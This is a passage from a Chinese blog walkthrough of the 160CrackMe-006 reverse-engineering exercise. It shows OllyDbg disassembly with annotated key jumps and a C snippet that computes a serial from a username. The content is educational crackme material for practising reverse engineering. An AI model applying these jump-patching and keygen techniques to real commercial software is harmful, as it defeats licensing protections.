class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442C78</span>  /.  <span class="hljs-number">55</span>            push ebp                                 ;  codiceChange<br><span class="hljs-attribute">00442C79</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00442C7B</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">9</span>          xor ecx,ecx<br><span class="hljs-attribute">00442C7D</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C7E</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C7F</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C80</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C81</span>  |.  <span class="hljs-number">53</span>            push ebx<br><span class="hljs-attribute">00442C82</span>  |.  <span class="hljs-number">56</span>            push esi<br><span class="hljs-attribute">00442C83</span>  |.  <span class="hljs-number">8</span>BD<span class="hljs-number">8</span>          mov ebx,eax<br><span class="hljs-attribute">00442C85</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442C87</span>  |.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442C88</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">562</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">56</span><br><span class="hljs-attribute">00442C8D</span>  |.  <span class="hljs-number">64</span>:FF<span class="hljs-number">30</span>       push dword ptr fs:[eax]<br><span class="hljs-attribute">00442C90</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8920</span>       mov dword ptr fs:[eax],esp<br><span class="hljs-attribute">00442C93</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442C96</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442C9C</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">1</span>F<span class="hljs-number">06</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CA1</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442CA4</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442CA7</span>  |.  E<span class="hljs-number">8</span> ACFCFBFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00402958</span><br><span class="hljs-attribute">00442CAC</span>  |.  <span class="hljs-number">8</span>BF<span class="hljs-number">0</span>          mov esi,eax<br><span class="hljs-attribute">00442CAE</span>  |.  <span class="hljs-number">837</span>D FC <span class="hljs-number">00</span>    cmp dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CB2</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">18</span>         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>CCC<br><span class="hljs-attribute">00442CB4</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">4</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442CB7</span>  |.  <span class="hljs-number">8</span>BC<span class="hljs-number">6</span>          mov eax,esi<br><span class="hljs-attribute">00442CB9</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">8249</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00407640</span><br><span class="hljs-attribute">00442CBE</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">55</span> F<span class="hljs-number">4</span>       mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442CC1</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442CC7</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">2406</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>F<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CCC</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> D<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>D<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442CD2</span>  |.  <span class="hljs-number">8078</span> <span class="hljs-number">47</span> <span class="hljs-number">00</span>    cmp byte ptr ds:[eax+<span class="hljs-number">0</span>x<span class="hljs-number">47</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CD6</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">0</span>F         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>CE<span class="hljs-number">7</span>              ;  关键跳转<span class="hljs-number">1</span><br><span class="hljs-attribute">00442CD8</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442CDA</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442CE0</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442CE2</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442CE5</span>  |.  EB <span class="hljs-number">49</span>         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">30</span><br><span class="hljs-attribute">00442CE7</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442CEA</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442CF0</span>  |.  E<span class="hljs-number">8</span> CB<span class="hljs-number">05</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CF5</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442CF8</span>  |.  <span class="hljs-number">50</span>            push eax<br><span class="hljs-attribute">00442CF9</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">0</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>]<br><span class="hljs-attribute">00442CFC</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> DC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>DC]<br><span class="hljs-attribute">00442D02</span>  |.  E<span class="hljs-number">8</span> B<span class="hljs-number">905</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442D07</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">0</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>]<br><span class="hljs-attribute">00442D0A</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D0B</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">2</span>CFDFFFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>A<span class="hljs-number">3</span>C<br><span class="hljs-attribute">00442D10</span>  |.  <span class="hljs-number">84</span>C<span class="hljs-number">0</span>          test al,al<br><span class="hljs-attribute">00442D12</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">0</span>F         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">23</span>               ;  关键跳转<span class="hljs-number">2</span><br><span class="hljs-attribute">00442D14</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442D16</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442D1C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442D1E</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442D21</span>  |.  EB <span class="hljs-number">0</span>D         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">30</span><br><span class="hljs-attribute">00442D23</span>  |&gt;  <span class="hljs-number">33</span>D<span class="hljs-number">2</span>          xor edx,edx<br><span class="hljs-attribute">00442D25</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442D2B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442D2D</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]<br><span class="hljs-attribute">00442D30</span>  |&gt;  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442D32</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D33</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D34</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D35</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8910</span>       mov dword ptr fs:[eax],edx<br><span class="hljs-attribute">00442D38</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">5</span>D<span class="hljs-number">2</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">5</span>D<br><span class="hljs-attribute">00442D3D</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">0</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>]<br><span class="hljs-attribute">00442D40</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">730</span>AFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442D45</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">4</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442D48</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">6</span>B<span class="hljs-number">0</span>AFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442D4D</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442D50</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">630</span>AFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442D55</span>  \.  C<span class="hljs-number">3</span>            retn<br></code></pre></div></td></tr></table></figure><p>尝试在eax+0x47这下硬件写入断点，发现并不能断下来，说明还是没有满足某个条件。</p><p>看第二个关键函数，可以看到一个计算，通过用户名算出serial，懒得再解释了QAQ，直接看下面代码吧。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442A8E</span>  |.  B<span class="hljs-number">8</span> <span class="hljs-number">01000000</span>   mov eax,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442A93</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">4</span>D FC       /mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]          ;  user<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">17276</span><br><span class="hljs-attribute">00442A96</span>  |.  <span class="hljs-number">0</span>FB<span class="hljs-number">64</span>C<span class="hljs-number">01</span> FF   |movzx ecx,byte ptr ds:[ecx+eax-<span class="hljs-number">0</span>x<span class="hljs-number">1</span>]<br><span class="hljs-attribute">00442A9B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">75</span> FC       |mov esi,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]          ;  user<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">17276</span><br><span class="hljs-attribute">00442A9E</span>  |.  <span class="hljs-number">0</span>FB<span class="hljs-number">63406</span>      |movzx esi,byte ptr ds:[esi+eax]<br><span class="hljs-attribute">00442AA2</span>  |.  <span class="hljs-number">0</span>FAFCE        |imul ecx,esi<br><span class="hljs-attribute">00442AA5</span>  |.  <span class="hljs-number">0</span>FAFC<span class="hljs-number">8</span>        |imul ecx,eax<br><span class="hljs-attribute">00442AA8</span>  |.  <span class="hljs-number">03</span>D<span class="hljs-number">9</span>          |add ebx,ecx<br><span class="hljs-attribute">00442AAA</span>  |.  <span class="hljs-number">40</span>            |inc eax<br><span class="hljs-attribute">00442AAB</span>  |.  <span class="hljs-number">4</span>A            |dec edx<br><span class="hljs-attribute">00442AAC</span>  |.^ <span class="hljs-number">75</span> E<span class="hljs-number">5</span>         \jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>A<span class="hljs-number">93</span><br><span class="hljs-attribute">00442AAE</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442AB1</span>  |.  E<span class="hljs-number">8</span> BA<span class="hljs-number">4</span>BFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00407670</span><br><span class="hljs-attribute">00442AB6</span>  |.  <span class="hljs-number">2</span>BD<span class="hljs-number">8</span>          sub ebx,eax<br><span class="hljs-attribute">00442AB8</span>  |.  <span class="hljs-number">81</span>FB <span class="hljs-number">9</span>A<span class="hljs-number">020000</span> cmp ebx,<span class="hljs-number">0</span>x<span class="hljs-number">29</span>A<br><span class="hljs-attribute">00442ABE</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">04</span>         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>AC<span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szname);<br><span class="hljs-keyword">int</span> sum = len;<br><span class="hljs-keyword">int</span> temp = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br>sum = ((szname[i] * szname[i + <span class="hljs-number">1</span>]) * temp) + sum;<br>temp++;<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br>serial = sum - <span class="hljs-number">0x29A</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, serial);<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/02/160CrackMe-006/5.png"></p><p>输入发现OK按钮已经亮了</p><p><img src="/2021/08/02/160CrackMe-006/6.png"></p><p>点击OK按钮发现，没有用，codice清0，然后OK又灰色了。</p><p><img src="/2021/08/02/160CrackMe-006/7.png"></p><p>从OK按钮入手，发现刚进来的第一个跳转就是熟悉的判断条件，说明程序并不是直接点击OK的，在这之前肯定还有一个条件要满足的。先继续在这里看一下，修改这个条件往下走，可以看到第二个跳转，修改这个跳转，按钮就会小时，经过分析之前这个函数就是算法。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442D64</span>  /.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442D65</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00442D67</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442D69</span>  |.  <span class="hljs-number">53</span>            push ebx<br><span class="hljs-attribute">00442D6A</span>  |.  <span class="hljs-number">8</span>BD<span class="hljs-number">8</span>          mov ebx,eax<br><span class="hljs-attribute">00442D6C</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442D6E</span>  |.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442D6F</span>  |.  <span class="hljs-number">68</span> ED<span class="hljs-number">2</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DED<br><span class="hljs-attribute">00442D74</span>  |.  <span class="hljs-number">64</span>:FF<span class="hljs-number">30</span>       push dword ptr fs:[eax]<br><span class="hljs-attribute">00442D77</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8920</span>       mov dword ptr fs:[eax],esp<br><span class="hljs-attribute">00442D7A</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> D<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>D<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442D80</span>  |.  <span class="hljs-number">8078</span> <span class="hljs-number">47</span> <span class="hljs-number">01</span>    cmp byte ptr ds:[eax+<span class="hljs-number">0</span>x<span class="hljs-number">47</span>],<span class="hljs-number">0</span>x<span class="hljs-number">1</span>           ;  熟悉的地址<br><span class="hljs-attribute">00442D84</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">12</span>         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">98</span><br><span class="hljs-attribute">00442D86</span>  |.  BA <span class="hljs-number">002</span>E<span class="hljs-number">4400</span>   mov edx,aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">00</span>                ;  UNICODE <span class="hljs-string">&quot;0&quot;</span><br><span class="hljs-attribute">00442D8B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442D91</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">5</span>A<span class="hljs-number">05</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>F<span class="hljs-number">0</span><br><span class="hljs-attribute">00442D96</span>  |.  EB <span class="hljs-number">3</span>F         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DD<span class="hljs-number">7</span><br><span class="hljs-attribute">00442D98</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442D9B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442DA1</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">1</span>A<span class="hljs-number">05</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442DA6</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DA9</span>  |.  E<span class="hljs-number">8</span> C<span class="hljs-number">248</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00407670</span><br><span class="hljs-attribute">00442DAE</span>  |.  <span class="hljs-number">50</span>            push eax<br><span class="hljs-attribute">00442DAF</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DB2</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> DC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>DC]<br><span class="hljs-attribute">00442DB8</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">0305</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442DBD</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442DC0</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DC1</span>  |.  E<span class="hljs-number">8</span> DAFDFFFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>BA<span class="hljs-number">0</span>                   ;  算法<br><span class="hljs-attribute">00442DC6</span>  |.  <span class="hljs-number">84</span>C<span class="hljs-number">0</span>          test al,al<br><span class="hljs-attribute">00442DC8</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">0</span>D         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>DD<span class="hljs-number">7</span><br><span class="hljs-attribute">00442DCA</span>  |.  <span class="hljs-number">33</span>D<span class="hljs-number">2</span>          xor edx,edx<br><span class="hljs-attribute">00442DCC</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442DD2</span>  |.  E<span class="hljs-number">8</span> D<span class="hljs-number">903</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004231</span>B<span class="hljs-number">0</span><br><span class="hljs-attribute">00442DD7</span>  |&gt;  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442DD9</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DDA</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span class="hljs-attribute">00442DDB</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  <span class="hljs-number">0018</span>F<span class="hljs-number">8</span>D<span class="hljs-number">4</span><br><span 